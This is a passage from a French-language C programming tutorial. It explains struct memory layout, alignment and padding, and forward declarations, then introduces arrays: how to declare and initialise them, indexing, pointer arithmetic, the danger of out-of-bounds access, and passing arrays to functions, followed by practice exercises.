employe ); return 0 ; } J'ai fixé des valeurs dans mon code par choix, mais rien ne vous empêche de les changer. C'est à vous d'adapter le code à vos besoins. } Vous pouvez aussi vous entrainer en codant une fonction affichant les données, une modifiant certains champs voire tous, etc. Votre imagination est la seule limite. Un peu de mémoire On sait maintenant utiliser nos structures. C'est bien, et pour être franc, on n'a pas vraiment besoin d'en savoir beaucoup plus pour utiliser celles-ci de manière basique. Mais un peu de culture générale ne fait pas de mal. Représentation en mémoire Savez-vous comment sont représentées nos structures en mémoire ? Rien de plus simple : en théorie, les variables d'une structure sont placées les unes après les autres en mémoire. J'ai bien dit en théorie, mais laissons cela pour plus tard. Par exemple, prenons une structure bidon. struct Exemple { double flottant ; char lettre ; unsigned int entier ; }; On va supposer qu'un double prend 8 octets, qu'un char en prend 1, et qu'un unsigned int en prend 4. Voici ce que donnerait cette structure en mémoire : Du moins, c'est de la théorie, comme nous allons bientôt le voir. sizeof Maintenant, supposons que vous vouliez connaitre la taille que votre structure prend en mémoire. Pour le savoir, vous pouvez utiliser l'opérateur sizeof . Cet opérateur donne la taille en bytes d'un type et s'utilise comme ceci : sizeof (char) , sizeof (int) , etc. Bref, il suffit de placer sizeof et de préciser le type dont on veut connaitre la taille entre parenthèses juste après (pour être plus exact, les parenthèse sont obligatoires dans le cas d'un type mais pas d'un identificateur, mais faisons comme si elles étaient tout le temps obligatoires, plus simple à retenir). Petite remarque : le résultat de l'opérateur sizeof est de type size_t et non de type int ou unsigned int comme on serait tenter de le penser de prime abord. La raison est très simple : cela est dû aux bornes de ces types. En effet, pour connaitre la taille d'un type simple comme int ou char , les bornes d'un unsigned int ou d'un int ne pose pas de problèmes. Mais sizeof peut aussi servir pour récupérer autre chose comme la taille de données plus élaborées. Et sur certains ordinateurs, on peut parfaitement avoir des données dont la taille dépasse les bornes d'un unsigned int ou d'un int . Aussi, pour résoudre ce problème, le type size_t a été crée et permet de contenir la taille de n'importe quelle donnée. À ce sujet, je vous propose un petit exercice : essayer d'afficher la taille de tous les types que vous connaissez. En C89, il n'existe pas d'indicateur de conversion spécifique à size_t . Il vous faudra donc utiliser celui prévu pour le type unsigned long (pour rappel, \"%lu\" ) et convertir le résultat de l'opérateur sizeof . [secret]{ #include <stdio.h> int main ( void ) { printf ( \"Taille d'un char = %lu \\n \" , ( unsigned long ) sizeof ( char )); printf ( \"Taille d'un short = %lu \\n \" , ( unsigned long ) sizeof ( short )); printf ( \"Taille d'un int = %lu \\n \" , ( unsigned long ) sizeof ( int )); printf ( \"Taille d'un long = %lu \\n \" , ( unsigned long ) sizeof ( long )); printf ( \"Taille d'un float = %lu \\n \" , ( unsigned long ) sizeof ( float )); printf ( \"Taille d'un double = %lu \\n \" , ( unsigned long ) sizeof ( double )); printf ( \"Taille d'un long double = %lu \\n \" , ( unsigned long ) sizeof ( long double )); return 0 ; } Que l'on se mette d'accord : ceci est le comportement rigoureux que l'on vous enseigne. Sans le cast, le comportement est indéterminé. Néanmoins, il reste assez lourd, et sachez que si vous n'êtes pas sur un ordinateur trop exotique (un PC par exemple), vous pouvez vous passer de cette technique. } Ceci étant fait pour des types simples, vous pouvez aussi le faire pour des structures. Par exemple, reprenons notre structure Exemple : struct Exemple { double flottant ; char lettre ; unsigned int entier ; }; Avec ce qu'on a dit plus haut, notre structure devrait prendre 8 octets pour un double , un octet pour le char , et 4 pour le unsigned int , ce qui donne un total de 13 octets. Essayons ce que cela donne : typedef struct Exemple { double flottant ; char lettre ; unsigned int entier ; } Exemple ; int main ( void ) { printf ( \"%d\" , sizeof ( Exemple )); return 0 ; } Et ce code affiche : 16 ... Hé hé, je dois avouer que je suis vraiment fier de mon coup. Et oui, vous êtes encore tombés dans un piège dont vous ne pouviez pas soupçonner l'existence. Je suis machiavélique ! Alignement en mémoire J'avoue que je vous dois des explications. Mais tout d'abord, sachez que ce 16 ne sort pas de n'importe où et qu'il est parfaitement normal. Mais autant prévenir : l'explication va paraitre assez déroutante. On va en effet aller regarder ce qui se passe au plus profond de la mémoire ! Mots Lorsque notre processeur va vouloir manipuler un champ de notre structure, il va d'abord commencer par la lire depuis la mémoire. Cette donnée sera alors transmise au processeur. Cette transmission se fait par un intermédiaire. Cet intermédiaire, c'est un ensemble de fils qui relient la mémoire et le processeur, et par lequel les données vont s'échanger entre processeur et mémoire. On l'appelle le bus de donnée . Ce bus de donnée permet souvent de charger plusieurs octets depuis la mémoire. Le processeur peut ainsi charger 2, 4 ou 8 octets d'un seul coup (parfois plus). On dit que le processeur accède un mot en mémoire. Ce mot n'est rien d'autre qu'une donnée qui a la même taille que le bus de donnée. Suivant le processeur, il existe parfois des restrictions sur la place de chacun de ces mots en mémoire. Alignement Certains processeurs ou certaines mémoires imposent des restrictions assez drastiques dans la façon de gérer ces mots. Certains processeurs (ou certaines mémoires) regroupent les cases mémoires en \"blocs\" de la taille d'un mot : ceux-ci utilise un certain alignement mémoire . On peut voir chacun de ces blocs comme une \"case mémoire\" fictive un peu plus grosse que les cases mémoires réelles et considérer que chacun de ces blocs possède une adresse. L'adresse d'un de ces groupes est l'adresse de l'octet de poids faible. Les adresses des octets situé dans le groupe (c'est à dire autre que l'octet de poids faible) sont inutilisables : on ne peut adresser qu'un groupe, via son octet de poids faible, et charger l'intégralité de ce mot sur le bus, mais pas accéder à un octet en particulier. L'adressage de la mémoire est donc moins \"fin\" : on travaille sur des blocs de plusieurs bits, plutôt que sur des petits paquets. Dans la réalité, ces blocs ont une taille égale à une puissance de deux : cela permet de faire quelques bidouilles sur le bus d'adresse pour économiser des fils et de simplifier le design de la mémoire. Des mots de 8 octets (64 bits) ne sont pas rares sur nos ordinateurs actuels. Accès mémoires non-alignés Bon, maintenant imaginons un cas particulier : je dispose d'un processeur utilisant des mots de 4 octets. Je dispose aussi d'un programme qui doit manipuler un caractère stocké sur 1 octet, un entier de 4 octets, et une donnée de 2 octets. Mais un problème se pose : le programme qui manipule ces données a été programmé par quelqu'un qui n'était pas au courant de ces histoire d'alignement, et il a répartit mes données dans la structure comme ceci : typedef struct Exemple { char lettre ; unsigned int entier_long ; short entier_court ; } Exemple ; Supposons que cet entier soit stocké à une adresse non-multiple de 4. Par exemple : Adresse Octet 4 Octet 3 Octet 2 Octet 1 A Caractère Entier Entier Entier A + 4 Entier Donnée Donnée - A + 8 - - - - Pour charger mon caractère dans un registre, pas de problèmes : celui-ci tient dans un mot. Il me suffit alors de charger mon mot dans un registre en utilisant une instruction de mon processeur qui charge un octet. Pour ma donnée de 2 octets, pas de problèmes non plus, vu que celui-ci est dans un mot. Mais si je demande à mon processeur de charger mon entier, ça ne passe pas ! Mon entier est en effet stocké sur deux mots différents, et on ne peut le charger en une seule fois : mon entier n'est pas aligné en mémoire . Dans ce cas, il peut se passer des tas de choses suivant le processeur qu'on utilise. Sur certains processeurs, la donnée est chargée en deux fois : c'est légèrement plus lent que la charger en une seule fois, mais ça passe. Mais sur d'autres processeurs, la situation devient nettement plus grave : le programme responsable de cet accès mémoire en dehors des clous se fait sauvagement planter le faciès sans la moindre sommation. Padding Pour éviter ce genre de choses, les compilateurs utilisés pour des langages de haut niveau préfèrent rajouter des données inutiles (on dit aussi du padding ) de façon à ce que chaque donnée soit bien alignée sur le bon nombre d'octets. En reprenant notre exemple du dessus, et en notant le padding X, on obtiendrait ceci : Adresse Octet 4 Octet 3 Octet 2 Octet 1 A Caractère X X X A + 4 Entier Entier Entier Entier A + 8 Donnée Donnée X X Ce sont ces données de padding qui ont fait passer notre structures de 13 à 16 octets. Comme quoi, l'explication était au final très simple. Comme vous le voyez, ces données de padding prennent un peu plus de place, et de la mémoire est gâchée inutilement. Économies Mais dans certains cas, on peut éviter de gaspiller de la mémoire inutilement en faisant attention à l'ordre de déclaration de nos variables. Par exemple, si on reprend l'exemple du dessus, on peut gagner 4 octets facilement. Il suffit de déclarer la structure comme ceci : typedef struct Exemple { unsigned int entier_long ; short entier_court ; char lettre ; } Exemple ; Si on regarde bien, cette structure donnerait ceci en mémoire : Adresse Octet 4 Octet 3 Octet 2 Octet 1 A Entier Entier Entier Entier A + 4 Donnée Donnée Caractère X Ce qui prend seulement 8 octets au lieu de 12. Certains octets de padding ont étés éliminées. Moralité : programmeurs, si vous voulez économiser de la mémoire, faites gaffe à bien gérer l'alignement en mémoire ! Essayez toujours de déclarer vos variables de façon à remplir un mot intégralement ou le plus possible. Renseignez-vous sur le padding , et essayez de savoir quelle est la taille de vos données avec ce cher sizeof . Compléments Structures contenant des structures Il est possible qu'une structure contienne des variables de type structure. Rien n'empêche d'imbriquer des structures dans d'autres. Pour vous en convaincre, sachez que l'exemple suivant est tout à fait légal en C. struct Point2D { int x ; int y ; }; struct Point3D { struct Point2D point2D ; int z ; }; Il y a deux conditions, la première étant bien sûr que la structure inclue soit définie avant celle l'incluant ; la deuxième est qu'une structure ne peut pas contenir des structures de son propre type : il semble évident qu'une structure de type X ne puisse pas contenir des structures de type X. Déclarations anticipées et pointeurs de structures La norme autorise le fait que l'on puisse déclarer une structure sans en préciser les champs si le compilateur n'a pas besoin de connaître la description de la structure (comme dans le cas des pointeurs sur structures). Ainsi, une déclaration anticipée de notre structure d'exemple de ce chapitre serait struct Personne; tout simplement. Bien entendu, il faut que dans le code il existe au moins une description complète des champs de la structure. Quel est l'intérêt des déclarations anticipées ? Eh bien il y en a deux. Le premier est en cas d'interdépendance entre structures . Imaginez deux structures A et B : la première contient un pointeur sur une structure de type B, et vice-versa. Illustration avec ce code : struct A ; struct B { struct A * var_a ; }; struct A { struct B * var_b ; }; Le deuxième intérêt des déclarations anticipées est si une structure contient des pointeurs sur des structures de son propre type. Ça parait obscur ? Il s'agit simplement de ce cas là : struct A ; struct A { struct A * ptr_a ; }; Ce code constitue une exception à la deuxième condition que nous avions énoncé dans la sous-partie précédente : il est possible de déclarer un pointeur (mais seulement un pointeur) sur une structure du même type que la structure que nous sommes en train de créer. Nous aurons l'occasion d'utiliser des structures de ce genre dans les chapitres sur les listes chainées. On va quand même faire un test : supprimer la déclaration anticipée du code précédent et constatez ... qu'il marche ! Encore une exception ? Eh bien il faut savoir que la portée d'une structure (revoyez le chapitre Découper son projet si vous avez oublié ce que c'est) démarre à l'accolade ouvrante du début et non au point-virgule à la fin. Ainsi, dès que je fais ceci : struct Identificateur { Je peux créer des pointeurs sur des structures de type Identificateur sans avoir à utiliser une déclaration anticipée. Tout ça est compliqué ? Alors n'hésitez pas à reprendre cette partie à tête reposée, car même si elle est théorique elle permettra de mieux comprendre la partie 5. Les structures en elles-même ne sont pas compliquées à comprendre, mais l'intérêt est parfois plus difficile à saisir. Ne vous en faîtes pas, nous aurons bientôt l'occasion de découvrir des cas où les structures se trouvent être bien pratiques. En attendant, n'hésitez pas à relire le chapitre s'il vous reste des points obscurs. Continuons notre route et découvrons à présent un deuxième type de données complexes : les tableaux . Les tableaux Continuons notre découvertes des données complexes en abordant cette fois la notion de tableaux . Comme le nom l'indique, un tableau est une regroupement de données, tout comme les structures. Mais alors, y'a t-il des différences et si oui quelles sont-elles ? La réponse se trouve à la suite, mais sachez que comme les structures, les tableaux sont très utilisés en C. C'est quoi un tableau ? En C, un tableau est une suite contigüe de données de même type. Cela implique deux choses que nous allons expliciter. Une suite contigüe de données . Cela veut dire que les données d'un tableau sont rangées les unes à la suite des autres en mémoire : on ne laisse pas le moindre vide. Les adresses sont par conséquent également consécutives. En clair, tout se passe comme si on avait rassemblé plusieurs variables de même type les unes à côté des autres. Un tableau est donc un gros bloc de mémoire qui commence à une adresse déterminée (celle de son premier élément) et qui contient un nombre fini d'éléments. Tous les éléments d'un tableau sont de même type . On ne peut donc pas se retrouver avec un int au beau milieu d'un tableau de char , par exemple. Du fait que les éléments sont de même type, ces derniers ont également tous la même taille et il est dès lors possible de déterminé la taille occupée en mémoire par un tableau : elle est égale au produit du nombre d'éléments, sa longueur , par la taille d'un élément. Leur utilité Le principal intérêt des tableaux est de rassembler plusieurs variables de même type ensemble pour les regrouper dans un seul objet. Par exemple, supposons que vous vouliez créer un petit programme pour calculer la moyenne de votre année scolaire. Vous aurez besoin de stocker toutes vos notes quelque part dans votre ordinateur. Bien entendu, vous pourriez utiliser autant de variables que vous avez de notes, mais cela serait très long à écrire. À la place, vous pouvez créer un tableau qui contiendra toutes vos notes, chaque élément de votre tableau étant une note (que vous pourrez stocker dans un nombre flottant ou un entier, par exemple), et manipuler directement ce tableau. Déclaration et initialisation Maintenant que nous avons vu ce qu'était un tableau, nous allons voir comment déclarer une variable de type tableau et comment l'utiliser. Déclaration La déclaration d'un tableau nécessite trois informations : la première est le type des éléments du tableau (rappelez vous qu'un tableau est une suite de données de même type) ; la seconde est le nom du tableau, son identificateur ; la dernière est la longueur du tableau (son nombre d'éléments). Cette dernière doit obligatoirement être une constante entière (il est cependant possible d'utiliser une macroconstante, comme nous le verrons). type identificateur[longueur]; Comme vous le voyez, la syntaxe de la déclaration d'un tableau est similaire à celle d'une variable, la seule différence étant qu'il faut préciser le nombre d'éléments entre crochets à la suite de l'identificateur du tableau. Exemples Ainsi, si je souhaite par exemple déclarer un tableau contenant 20 int , je dois procéder comme suit : int tableau [ 20 ]; C'est aussi simple que ça. Entrainons-nous avec quelques exemples simples pour voir si vous avez bien compris. Essayez de déclarer un tableau : de 15 char ; de 25 float ; de 4 unsigned int ; de 10 short ; de 5 struct Personne (celle vue dans le chapitre précédent) ; de 7 pointeurs sur int ; Et voilà la correction . Comme vous pouvez le voir, il est possible de déclarer un tableau de n'importe quel type, aussi complexe soit-il. Macroconstante Concernant la taille, il est également possible de la définir à l'aide d'une macroconstante, comme ceci : #define N 5 int tab [ N ]; En effet, après le pasage du préprocesseur, la macroconstante sera remplacée par sa définition (à savoir la constante entière 5 dans notre cas), ce qui est parfaitement valide. Initialisation Lorsque l'on déclare un tableau, il se passe la même chose que pour les variables : si celui-ci n'est pas déclaré avec le mot-clé static , ses éléments ont une valeur indéterminée. L'ordinateur a juste réquisitionné un bloc de mémoire pour stocker ce tableau et c'est tout, il n'a pas modifié son contenu. Comme pour les variables, il est possible d'initialiser un tableau, ce qui n'est rien de moins qu'initialiser tout ou partie de ses éléments. Pour ce faire, il y a deux manières de procéder, mais dans les deux cas, il est nécessaire de préciser les valeurs des éléments du tableau une par une. Ces valeurs seront séparées par une virgule, et l'ensemble de ces valeurs est entouré d'accolades. Le tout est affecté au tableau lors de sa déclaration. Initialisation avec longueur explicite Le premier type d'initialisation consiste à initialiser un tableau dont la longueur est précisée entre crochets. Dans ce cas, il est indispensable de respecter cette longueur pour éviter des erreurs (pour un tableau de longueur $x$, on doit initialiser au plus $x$ éléments). type identificateur[longueur] = {valeurs}; Prenons l'exemple d'un tableau de 3 entiers, dont on veut initialiser le premier élément à 5, le second à -48 et le dernier à 972. int tableau [ 3 ] = { 5 , - 48 , 972 }; Dans cet exemple, on a un tableau de 3 int , on est donc obligé de respecter cette longueur, et on ne peut initialiser que 3 éléments au maximum. Mettez-en plus et vous risquez d'avoir des problèmes. Petite remarque : il est possible de n'initialiser que certains éléments d'un tableau déclaré de cette façon. Il suffit de ne pas préciser les valeurs des autres éléments. int tableau [ 5 ] = { 2 , 3 }; Dans cet exemple, je définis un tableau de 5 int , mais je n'initialise que les deux premiers éléments. Que deviennent dès lors les autres ? Ils sont automatiquement mis à zéro. Du coup, pour initialiser tous les éléments d'un tableau à zéro, il suffit d'écrire : type identificateur[longueur] = {0}; Initialisation avec longueur implicite Le second type d'initialisation consiste à initialiser un tableau dont la longueur n'est pas fixée. type identificateur[] = {valeurs}; Dans ce cas, la longueur est précisée de façon implicite : c'est le nombre d'éléments entre accolades qui la déterminera. Prenons l'exemple ci-dessous : int tableau [] = { 7 , 8 , 9 , - 41 , 213 , 945 }; Dans ce dernier, 6 éléments sont initialisés, on obtient donc au final un tableau de 6 int Accès aux éléments Si on sait maintenant déclarer et initialiser des tableaux, il faut encore que ceux-ci servent à quelque chose. Et pour cela, on doit pouvoir modifier ou récupérer les éléments de celui-ci. Pour cela, chaque élément d'un tableau est identifié par sa place dans le tableau. On peut choisir d'accéder au premier élément d'un tableau, au second, au troisième, ..., au n-ième élément, etc. Pour cela, chacun de ces éléments se voit attribuer un indice (un nombre entier) qui détermine sa place dans le tableau. Mais il y a une petite subtilité : ces indices commencent toujours à 0. Le premier élément est celui d'indice 0, le second a pour indice 1, le troisième est à l'indice 2, etc. Pour un tableau de $x$ éléments, les indices vont donc de 0 à $x - 1$. On peut notamment se demander pourquoi le premier élément d'un tableau se voit attribuer l'indice zéro. Après tout, il aurait été plus logique de faire commencer nos indices à 1. D'ailleurs, c'est le cas dans d'autres langages de programmation : le premier indice d'un tableau n'est pas le zéro, mais le 1. Et certains langages vont encore plus loin, mais passons. Calcul d'adresse Alors pourquoi ce choix contre-intuitif ? Cela vient de la façon dont sont stockés les tableaux en mémoire. En fait, pour accéder à un élément, vous devrez connaitre l'adresse de celui-ci. Heureusement, déterminer l'adresse d'un élément d'un tableau se fait assez simplement. En effet, puisque tous les éléments se suivent en mémoire, leurs adresses peuvent toutes se calculer à l'aide d'un indice et de l'adresse du début du tableau (celle de son premier élément). Manipuler les éléments d'un tableau se fait avec des pointeurs. Pour accéder à un élément d'un tableau, vous devrez connaitre l'adresse de celui-ci, et donc avoir un pointeur sur cet élément. Déterminer l'adresse d'un élément dans un tableau se fait assez simplement: quelques calculs suffisent. Eh oui, vous avez bien lu : notre adresse peut être calculée. Pour calculer l'adresse d'un élément, vous avez besoin de deux choses : son indice, et l'adresse de début du tableau. Pour calculer cette adresse, on utilise le fait que les éléments d'un tableau ont une taille fixe et sont rangés dans des adresses mémoires consécutives. Prenons un exemple : un tableau d'entiers, prenant chacun 4 octets. Le premier élément d'indice zéro est placé à l'adresse $A$ : c'est l'adresse à laquelle commence le tableau en mémoire. Le second élément est placé 4 octets après (vu que le premier élément prend 4 octets) : son adresse est donc $A+4$. Le troisième élément est placé 4 octets après le second élément, ce qui donne l'adresse $(A+4) + 4$. Si vous continuez ce petit jeu pour quelques valeurs, on obtiendrait quelque chose dans le genre : Indice i Adresse de l'élèment 0 A 1 A+4 2 A+8 3 A+12 4 A+16 5 A+20 ... ... Vous remarquerez surement que l'on ajoute toujours un multiple de quatre (puisque dans cet exemple la taille d'un int est de quatre octets) et que l'on peut dès lors reformuler la table ci-dessus comme suit : Indice i Adresse de l'élèment 0 A + (0 * 4) 1 A + (1 * 4) 2 A + (2 * 4) 3 A + (3 * 4) 4 A + (4 * 4) 5 A + (5 * 4) On peut donc formaliser cette remarque mathématiquement en posant $T$ la taille d'un élément du tableau, $i$ l'indice de cet élément, et $A$ l'adresse de début du tableau (l'adresse du premier élément) : l'adresse de l'élément d'indice $i$ vaut toujours $A + T \\times i$. Avec cette formule, on voit bien que l'indice du premier élément ne peut pas être autre chose que 0. Le premier élément a la même adresse que le début du tableau : c'est-à-dire A. On est obligé d'avoir i = 0 pour que cette formule convienne. Après, rien n'empêche de faire quelques bidouilles arithmétiques sur l'indice pour que le premier élément ait un indice différent de 0, mais le calcul de l'adresse sera alors plus compliqué, plus long à effectuer. Et dans un langage comme le C, conçu pour être performant, c'est niet ! Quoi qu'il en soit, pour effectuer ce calcul d'adresse, nous avons besoin de trois éléments : la taille du type de chaque élément ; l'adresse de début du tableau ; l'indice. Adresse du premier élément Pour effectuer ce calcul d'adresse, il nous manque encore l'adresse du début de notre tableau. Cette adresse n'est rien d'autre que l'adresse de son premier élément. Reste à savoir comment le C nous permet d'obtenir cette adresse. La solution est sous vos yeux : regardez l'identificateur de votre tableau, c'est ça votre adresse. Hé oui, c'est choquant, et pourtant c'est la vérité ! En effet, dans une expression, l'identificateur d'un tableau se comporte comme un pointeur constant sur le début du tableau. Du moins, ce n'est valable qu'en dehors des déclarations et à l'exception de deux cas que nous allons voir tout de suite. Remarquez que puisque l'identificateur d'un tableau se comporte comme un pointeur constant sur son premier élément, il est dès lors impossible de lui assigner quoi que ce soit. int tab1 [ 3 ] = { - 78 , 4688 , 5 }; int tab2 [ 3 ]; tab2 = tab1 ; /* interdit */ La première exception est l'application de l'opérateur & à un identificateur de type tableau. En effet, les expressions &nom_du_tableau et nom_du_tableau contiennent toutes les deux l'adresse du premier élément. La preuve : essayez ce petit code, pour vous en convaincre. #include <stdio.h> int main ( void ) { int tab [ 5 ] = { 5 , 5 , 5 , 5 , 5 }; printf ( \"%d\" , tab == & tab ); return 0 ; } La seconde exception est l'utilisation de l'opérateur sizeof qui, lorsqu'il est appliqué à un identificateur de type tableau, donne bien la taille de tout le tableau et non la taille d'un pointeur comme on serait tenter de le penser. L'exemple ci-dessous illustre cette propriété. #include <stdio.h> int main ( void ) { int tab [ 10 ]; printf ( \"sizeof(int) = %lu \\n \" , ( unsigned long ) sizeof ( int )); printf ( \"sizeof(int *) = %lu \\n \" , ( unsigned long ) sizeof ( int * )); printf ( \"sizeof(tableau) = %lu \\n \" , ( unsigned long ) sizeof ( tab )); return 0 ; } sizeof(int) = 4 sizeof(int *) = 4 sizeof(tableau) = 40 On observe que la troisième ligne affiche bien la taille du tableau en octets ($10 \\times 4$ octets) et non celle d'un pointeur comme la deuxième ligne. Cette particularité est utile pour obtenir la longueur d'un tableau : il suffit de diviser la taille totale du tableau par la taille d'un élément. #include <stdio.h> int main ( void ) { int tab [ 10 ]; printf ( \"nombre d'éléments = %lu \\n \" , ( unsigned long )( sizeof ( tab ) / sizeof ( int ))); return 0 ; } Arithmétique des pointeurs Ensuite, malins comme vous êtes, vous vous êtes dit que calculer l'adresse se faisait en utilisant directement la formule vue au-dessus. Prenons un exemple : vous voulez accéder à l'élément d'indice 7 d'un tableau de int nommé tab . Vous êtes donc tentés d'écrire quelque chose comme : tab + (7 * sizeof(int)) . Le seul problème, c'est que cela ne marchera pas ! Pourtant, vous n'avez rien fait de mal. Vous êtes juste tombé dans un piège : en C, les pointeurs sont typés. Un pointeur sur un int n'est pas vraiment la même chose qu'un pointeur sur un char . La différence tient dans le fait que le compilateur tient compte du type du pointeur pour faire les calculs. En C, si j'ai un pointeur sur un int nommé ptr , ++ptr ne pointe pas sur l'adresse suivante, mais sur l'adresse du int placé juste après. Et c'est la même chose pour les additions : ptr + 7 pointera sur l'adresse du 7ème int suivant ptr . En clair : dans notre calcul d'adresse, on n'a pas besoin de mentionner la taille prise par un élément. Le compilateur le fait pour vous. Pour accéder à un élément d'indice i dans un tableau nommé tab , il suffit donc de calculer son adresse en faisant (tab + i) , et de déréférencer le tout. On obtient alors l'expression *(tab + i) . Formalisme tableaux Calculer des adresses à la main de cette façon est tout de même assez lourd. Heureusement, le C fournit une syntaxe un peu plus simple afin d'accéder à un élément d'un tableau en fonction de son indice. Il ne vous est donc pas nécessaire de vous soucier de tout ce calcul d'adresse, le compilateur s'en chargera pour vous. Cette syntaxe est la suivante : identificateur [ indice ]; Notez qu'il est également possible d'utiliser la syntaxe suivante qui est strictement équivalente : * (( identificateur ) + ( indice )) Cependant, comme vous le voyez, la syntaxe à base de [] est beaucoup plus lisible, et il n'y a aucune raison de s'en passer : elle est plus lisible, n'est pas plus lente (au contraire), elle est plus rapide à taper, etc. C'est ce qu'on appelle un sucre syntaxique, à savoir une petite fonctionnalité qui permet de rendre un langage plus agréable et plus facile à lire ou à écrire. Maintenant que vous connaissez cette syntaxe, sachez que c'est celle-ci qu'il est préférable d'utiliser pour accéder à un élément dans un tableau. Afin d'être tout à fait clair, voici un exemple affichant les valeurs respectives des différents éléments d'un tableau. #include <stdio.h> int main ( void ) { int tab [ 4 ] = { 10 , 20 , 30 , 40 }; printf ( \"%d \\n \" , tab [ 0 ]); printf ( \"%d \\n \" , tab [ 1 ]); printf ( \"%d \\n \" , tab [ 2 ]); printf ( \"%d \\n \" , * (( tab ) + ( 3 ))); /* équivalent à tab[3] */ return 0 ; } Le cas des structures Les tableaux de structures s'utilisent en même temps comme un tableau et comme une structure. Si l'on prend un tableau de $n$ structures, alors on accède aux éléments comme ceci s'il s'agit d'un tableau de structures : identificateur [ indice ]. champs ; et comme ceci s'il s'agit d'un tableau de pointeurs de structures : identificateur [ indice ] -> champs ; Ce n'est pas très compliqué, mais mieux vaut clarifier pour ceux qui auraient des doutes. Débordement de tableaux Une des plus grandes erreurs en C est le débordement de tableaux à cause des indices. En effet, si vous tentez d'accéder à une case qui n'appartient pas à votre tableau, vous vous retrouvez face à un comportement indéterminé. C'est certainement le point le plus important du chapitre, mais aussi celui qui entraine le plus de problèmes : si par inadvertance, vous essayez d'accéder à un élément qui n'appartient pas au tableau sur lequel vous êtes en train de travailler, vous aurez de gros soucis. Exemple Regardez ce code par exemple, volontairement erroné : #include <stdio.h> int main ( void ) { int tableau [ 5 ] = { 784 , 5 , 45 , - 12001 , 8 }; int somme = 0 ; size_t i ; for ( i = 0 ; i <= 5 ; ++ i ) { somme += tableau [ i ]; } printf ( \"%d \\n \" , somme ); return 0 ; } Le problème de ce code se situe comme vous l'aurez compris au niveau de la boucle. En effet, le tableau contient 5 cases et le programme en parcours 6 ( i <= 5 à la place de i < 5 ) ! Donc on tente d'accéder à une zone qui ne nous appartient pas. C'est une erreur assez courante et qu'on peut éviter simplement : il suffit de ne pas oublier que pour un tableau à $n$ éléments, les indices valides vont de 0 à $n-1$. Soyez donc prudent quand vous utilisez les boucles pour parcourir des tableaux. Tableaux et fonctions Dans ce qu'on a vu précédemment, on sait comment déclarer et initialiser des tableaux, et récupérer un élément avec un indice. Mais cela ne suffit pas pour savoir comment manipuler nos tableaux : on doit encore voir comment faire fonctionner ensemble tableaux et fonctions. Il existe en effet quelques petites singularités qu'ont les tableaux quand on cherche à les utiliser avec des fonctions. Il est parfois impossible de le retourner, et passer des tableaux en argument faire apparaitre certains comportements assez déroutants. Voyons un peu ce qu'il en est. Passer un tableau en paramètre de fonction Pour envoyer un tableau dans une fonction, il nous faut passer en argument le tableau, et éventuellement sa taille. Ce dernier paramètre est obligatoire dès lors que vous voulez faire une boucle : il faut bien transmettre la taille du tableau pour que la boucle ne dépasse pas le nombre de case du tableau. Pour passer un tableau à une fonction, il suffit de la déclarer comme ceci : type_fonction identificateur(type_tableau tableau[]); Voici un exemple banal de fonction : void fonction ( int tableau [], size_t taille ); Pourquoi ne précise-t-on pas la taille du tableau entre crochets ? Car le compilateur n'en tient pas compte. Peu importe la taille entre crochets, le compilateur l'ignore. Si vous connaissez la taille et que le tableau ne change jamais, vous pouvez la mettre. Si vous n'êtes pas sûrs, dans le doute, ne mettez rien. Une histoire de copie Au fait : si vous vous souvenez de ce qu'il y a écrit plus haut, vous savez qu'en dehors de deux exceptions, un tableau est souvent converti en un pointeur sur son premier élément. Si vous passez un tableau en argument d'une fonction, ce sera le cas. Grâce à cette conversion, il est également possible de passer un tableau en argument d'une fonction comme ceci : int fonction ( int * tableau ); Cette forme est strictement équivalente à l'autre forme vue plus haut. Le choix de telle ou telle forme est personnel et ne change rien ; moi-même, j'utilise la première forme, que je trouve plus explicite. Quoi qu'il en soit, dans les deux cas on passe l'adresse du tableau à la fonction, ce qui fait qu'on travaille toujours sur l'original et non sur une simple copie comme c'est le cas avec les variables. Retourner un tableau De la même manière que pour les arguments, si vous retournez un tableau, votre fonction retournera au final l'adresse de son premier élément et donc un pointeur sur son premier élément. Cependant, garder à l'esprit que les variables définies au sein d'une fonction sont détruites à la fin de celle-ci et que, par conséquent, vous retourner dès lors l'adresse d'un tableau qui n'existe plus. ​ Exercices Comme nous avons vu plein de nouveautés dans ce chapitre, il faut pratiquer pour bien retenir toutes ces notions. Je vous propose donc toute une série d'exercices pour manipuler les tableaux. À chaque fois, je vous donne l'énoncé, puis c'est à vous de coder. Vous pourrez alors comparer avec la correction. Sachez que mes codes ne sont pas les meilleurs, et si vous arrivez à faire l'exercice, c'est déjà très bien. Donc pas d'inquiétude si votre code est différent du mien. Somme Pour commencer, essayez de calculer la somme d'un tableau, c'est-à-dire la somme de tous ses éléments, et de retourner le résultat. Bon courage. Si vous avez fini, alors voici la correction . Maximum et minimum On peut aussi faire un peu plus complexe que simplement calculer la somme d'un tableau. Dans cet exercice, vous allez devoir créer une fonction qui donne le maximum et le minimum d'un tableau. Comme on veut récupérer deux valeurs, on ne peut pas utiliser de return . Un conseil : commencer par créer une fonction qui trouve le maximum (ou le minimum) d'un tableau et cherchez à l'améliorer pour qu'elle puisse gérer aussi le minimum. Mais attention : souvenez-vous qu'une fonction ne peut renvoyer qu'une seule valeur à la fois. Gérer maximum et minimum nécessitera une astuce. Voici ma solution parmi tant d'autres. Comme vous le voyez, j'ai utilisé des pointeurs pour fournir le maximum et le minimum de mon tableau. Comme quoi, les pointeurs sont utiles. Recherche d'un élément dans un tableau Dans cet exercice-ci, vous allez devoir créer une fonction qui prend en entrée un nombre, un tableau de int et la longueur du tableau. Celle-ci teste la présence de ce nombre dans le tableau passé en entrée. La fonction doit renvoyer 0 si le nombre n'est pas dans le tableau, et 1 s'il y est présent. À vos claviers ! Voici la correction . Pour information, on peut faire bien plus rapide si jamais le tableau passé en entrée de notre fonction est trié. On peut alors utiliser une recherche dichotomique . Inverser les éléments d'un tableau Cette fois-ci, on va vous demander quelque chose de plus compliqué. Vous allez devoir inverser les éléments d'un tableau : celui qui se trouve à la fin va se retrouver au début (et réciproquement), le second élément va se retrouver avant-dernier (et réciproquement), etc. Autre détail : vous n'avez pas le droit d'utiliser un autre tableau pour résoudre cet exercice. Le seul tableau que vous devez manipuler dans cet exercice est celui qui sera passé en paramètre de notre fonction. À vos claviers ! Je vous préviens, cela sera assez difficile. N'hésitez pas à prendre du temps sur ce problème. Pour ceux qui ont fini, voici la correction. [secret]{ En fait, il fallait trouver une petite astuce pour ne pas avoir à utiliser de tableau supplémentaire. Il faut utiliser une fonction qui échange deux éléments dans notre tableau, et l'appliquer sur les bons éléments. Cette fonction n'est rien 